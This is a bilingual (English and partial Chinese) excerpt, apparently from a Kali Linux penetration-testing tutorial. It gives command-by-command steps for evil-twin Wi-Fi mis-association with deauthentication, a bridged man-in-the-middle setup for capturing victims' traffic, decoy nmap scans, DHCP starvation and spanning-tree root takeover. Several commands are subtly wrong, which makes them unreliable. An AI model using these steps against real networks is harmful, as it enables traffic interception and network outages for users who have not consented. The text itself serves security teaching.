- md: "\n# Mis-Association attacks on wireless\n\n![](img/c6b688dca6570d17db3036b560ef0905_60_0.png)\n\
    \nThe technique of mis-association attack is to get a computer connect to your\
    \ Kali machine using one of the old Wirelesses that it has connected before. Or\
    \ use the same SSID name as is available and has some clients. For example, if\
    \ a computer was connected to the WIFI network called “Public-wifi” in the past,\
    \ that name will be discovered and used to attack to the host.\n\nThe steps are\
    \ as below:\n\n- Find one of the wireless SSID names that the victim has connected\
    \ before using “airodump-ng\"\n- Set up a new access point with exactly the same\
    \ name\n- Send a de-auth message to the victim to it will be disconnected from\
    \ the current AP and try to connect again\n- As the SSID you created is already\
    \ on the victim’s list, it will be connected to your created AP.\n- You can start\
    \ capture victim’s traffic!\n\nTo achieve this below steps need to be followed:\n\
    \n- airmon-ng start wlan0\n- airodump-ng mon0 -- -- You can see the station is\
    \ trying to connect to a list of Aps that it has connected before (probe column)\
    \ - e.g Publicwifi\n  - Note: make sure that SSID is not available on the current\
    \ list of APs\n- airbase-ng -essid “Public-wifi” -c 1 mon0 -- This will make Kali\
    \ an access point and client can authenticate and connect\n- Set up DHCP and other\
    \ setting as per previous section (Rogue access points)\n- Now the client station\
    \ will try to connect to your computer as it has the same SSID on its database\n\
    - If client machine is already connected to another WIFI, start a de-auth attach\
    \ as below\n- aireplay-ng -0 0 -a 22:AF:3A:5E:22:3D mon0 -- Force clients to reauthenticate\
    \ and connect to our machine\n- Monitor the output of airbase-ng command to see\
    \ when the victim connects\n\n# Wireless Man in the middle attack using bridging\n\
    \n![](img/c6b688dca6570d17db3036b560ef0905_62_0.png)\n\nOne of the common attacks\
    \ on wireless networks is the Man In The Middle (MIDM) attack. To achieve this\
    \ you need to set up your Kali as an access point and its network cards in bridge\
    \ mode, so client won't notice any change. Once the client is connected to your\
    \ device and you use the network as normal, sniffers like Wireshark can be used\
    \ to capture its traffic.\n\n- Use the above steps to create an AP with airmon-ng,\
    \ airodump-ng and airbase-ng\n- Commands to achieve this as below:\n  - ifconfig\
    \ - verify the hardware\n  - Set up the access point on your wireless interface\n\
    \    - airmon-ng start wlan0\n    - airodump-ng mon0\n    - airbase-ng -essid\
    \ “Corporate-WIFI” -c 1 mon0\n- Set up the bridge interface for between at0 and\
    \ eth0 called BR1\n\n- ifconfig at0\n- brctl addbr BR1\n- brctl addif BR1 eth0\n\
    - brctl addif BR1 at0\n- brctl show\n- ifconfig eth0 0.0.0.0 up\n- ifconfig at0\
    \ 0.0.0.0 up\n- ifconfig BR1 192.168.1.205/24 up\n- Test and enable IP forwarding\n\
    \  - ping 192.168.1.1\n  - echo 1 >/proc/sys/net/ipv4/ip_forward\n\n# Nmap - Free\
    \ Security Scanner\n\n![](img/c6b688dca6570d17db3036b560ef0905_64_0.png)\n\nNmap\
    \ is one of the best and most popular scanning tools which can be used post reconnaissance\
    \ step. It has a lot built-in features and plugins which can be used to identify\
    \ the vulnerable hosts and services on the network or over Internet.\n\nUsing\
    \ “man nmap” and “nmap -h” you can familiarize yourself with its options and usage.\n\
    \n- Below we explain some examples of using nmap\n  - nmap 192.168.1.24 -- Scanning\
    \ one IP address\n  - nmap 192.168.1.0 - 255 -- Scanning a range of IP addresses\n\
    \  - nmap 192.168.1.0/24 -- Scanning a subnet\n  - nmap -sP -iP0 -- Ping scan\n\
    \  - nmap -sS -PP0 -sV -O 192.168.1.0-50 -- TCP Syn scan, Protocol scan, determine\
    \ the version, discover the operating system\n- nmap -T5 192.168.1.0/24 -- Timing\
    \ aggressiveness - T5 is quicker than T1\n- nmap -top-ports 20 192.168.1.0/24\
    \ -- only top 20 ports - popular ports\n- nmap -sT -p80 192.168.1.50-100 -- TCP\
    \ scan, only port 80\n- nmap -sS 192.168.1.1-5 -D 192.168.98,192.168.1.99 -- Will\
    \ send the scans from multiple source IP addresses that you specify after D. This\
    \ can distract the network admin as there are a lot of scans from multiple sources\n\
    - nmap -V 192.168.1.6 -- Verbose mode will provide more details on screen\n- nmap\
    \ -F 192.168.1.0/24 -exclude 192.168.1.1,192.168.1.2 -- -F means only top 100\
    \ ports to be scanned and exclude those two IP address from the range\n- nmap\
    \ -Pn 192.168.1.6 -- It won't do ping but just do the scan. Without this option,\
    \ it will try pinging the host first\n- nmap --iflist -- Get a list of interfaces\
    \ and IPs\n- nmap -A -T4 192.168.1.1 --A means do the Script, Operating NMAP with\
    \ version, traceroute, T4 for timing\n- Using Nmap with IPv6\n  - ifconfig eth0\
    \ ipv6 add 2001:db8:6783:1::64\n  - nmap -6 2001:db8:6783:1::1\n- Nmap Scripts\n\
    \  - nmap --script=default 192.168.1.24 -- The same as nmap -sC 192.168.1.24\n\
    \  - There are a lot of script options like DoS, Safe, exploit, malware, vulnerability,\
    \ discovery, etc.\n  - nmap --script-help discovery -- This is a help for the\
    \ scripts\n  - nmap -script “safe or default” 192.168.1.24 -- Run default and\
    \ safe scripts together\n  - nmap -script “discovery and” 192.168.1.24\n- Nmap\
    \ GUI\n  - There is a graphical interface for nmap if you prefer to use. The graphical\
    \ interface is called zenmap.\n\n# DHCP Starvation\n\n![](img/c6b688dca6570d17db3036b560ef0905_66_0.png)\n\
    \nOn most of corporate networks there are DHCP servers which serve the IP addresses\
    \ to clients. DHCP Starvation is basically a type of DoS attack in which an attacker\
    \ sends unlimited requests to the DHCP server until it fills up the pool and blocks\
    \ user from accessing anything on network.\n\n- The tool that will be used for\
    \ this attack is Yersinia\n- yersinia -G -- Graphical interface of yersinia\n\
    - Select DHCP and launch attack\n- Select “Sending DISCOVER Packet” and Launch\
    \ the attack\n- This will start asking for IP addresses until it fills up pool\n\
    \n![](img/c6b688dca6570d17db3036b560ef0905_67_0.png)\n\n# Become the Root of Spanning\
    \ Tree\n\n![](img/c6b688dca6570d17db3036b560ef0905_68_0.png)\n\nThe Spanning Tree\
    \ Protocol (STP) is a network protocol that ensures a loop-free topology for any\
    \ bridged Ethernet local area network. The basic function of STP is to prevent\
    \ bridge loops and the broadcast radiation results from them.\n\nThe root bridge\
    \ of the spanning tree is the bridge with the smallest (lowest) bridge ID which\
    \ is the focal point in the network. The root bridge of the spanning tree is the\
    \ bridge with the smallest (lowest) bridge ID. Each bridge has a configurable\
    \ priority number and a MAC Address; the bridge ID contains both numbers together\
    \ - bridge priority + MAC (32768.0200.0000.1111).\n\nWith this attack, we can\
    \ take over the bridge responsibility and break the network operation.\n\n- The\
    \ tool that will be used for this attack is Yersinia\n- One option is to have\
    \ a device between two switches (potentially a hub) and connect Kali to that device\n\
    - Second option is if you have two interfaces on Kali and connect each to one\
    \ switch and launch a STP+Man in the middle attack and Kali will become root\n\
    \n- Then we can advertise device as STP root\n- Yersinia -G -- Graphical interface\
    \ of yersinia\n- Select STP and launch attack\n- Select “Claiming Root Role” and\
    \ Launch the attack\n\n![](img/c6b688dca6570d17db3036b560ef0905_69_0.png)\n"
  mdcn: "\n\n# 无线网络误关联攻击 (Mis-Association attacks)\n\n![](img/c6b688dca6570d17db3036b560ef0905_60_0.png)\n\
    \n误关联攻击技术是让计算机使用其以前连接过的某个旧无线网络连接到你的 Kali 机器。或者使用与当前可用且已连接客户端的网络相同的 SSID 名称。例如，如果某台计算机曾经连接过名为“Public-wifi”的\
    \ WIFI 网络，该名称将被发现并用于攻击该主机。\n\n步骤如下：\n\n- 使用 “airodump-ng” 找到受害者以前连接过的一个无线 SSID\
    \ 名称\n- 建立一个名称完全相同的新接入点（AP）\n- 向受害者发送取消认证（de-auth）消息，使其断开当前的 AP 连接并尝试重新连接\n- 由于你创建的\
    \ SSID 已经在受害者的列表中，它将连接到你创建的 AP\n- 你可以开始捕获受害者的流量！\n\n要实现这一点，需要遵循以下步骤：\n\n- `airmon-ng\
    \ start wlan0`\n- `airodump-ng mon0 --` -- 你可以看到站点正尝试连接到它以前连接过的一个 AP 列表（probe\
    \ 列） - 例如 Publicwifi\n  - 注意：确保该 SSID 在当前 AP 列表中不可用\n- `airbase-ng -essid “Public-wifi”\
    \ -c 1 mon0` -- 这将 Kali 变成一个接入点，客户端可以认证并连接\n- 根据前面的章节章节（流氓接入点）设置 DHCP 和其他设置\n\
    - 现在客户端站点将尝试连接到你的计算机，因为它的数据库中有一个相同的 SSID\n- 如果客户端机器已连接到另一个 WIFI，则按下文启动取消认证攻击\n\
    - `aireplay-ng -0 0 -a 22:AF:3A:5E:22:3D mon0` -- 强制客户端重新认证并连接到我们的机器\n- 监控 `airbase-ng`\
    \ 命令的输出，查看受害者何时连接\n\n# 使用桥接的无线网中间人攻击 (Wireless Man in the middle attack)\n\n![](img/c6b688dca6570d17db3036b560ef0905_62_0.png)\n\
    \n无线网络上的常见攻击之一是中间人（MIDM）攻击。要实现这一点，你需要将你的 Kali 设置为接入点，并将其网卡设置为桥接模式，这样客户端就不会察觉任何变化。一旦客户端连接到你的设备且你正常使用网络，就可以使用\
    \ Wireshark 这样的嗅探器来捕获其流量。\n\n- 使用上述步骤通过 `airmon-ng`、`airodump-ng` 和 `airbase-ng`\
    \ 创建 AP\n- 实现此点的命令如下：\n  - `ifconfig` - 验证硬件\n  - 在你的无线接口上设置接入点\n    - `airmon-ng\
    \ start wlan0`\n    - `airodump-ng mon0`\n    - `airbase-ng -essid “Corporate-WIFI”\
    \ -c 1 mon0`\n- 为 `at0` 和 `eth0` 之间建立桥接接口，命名为 BR1\n\n- `ifconfig at0`\n- `brctl\
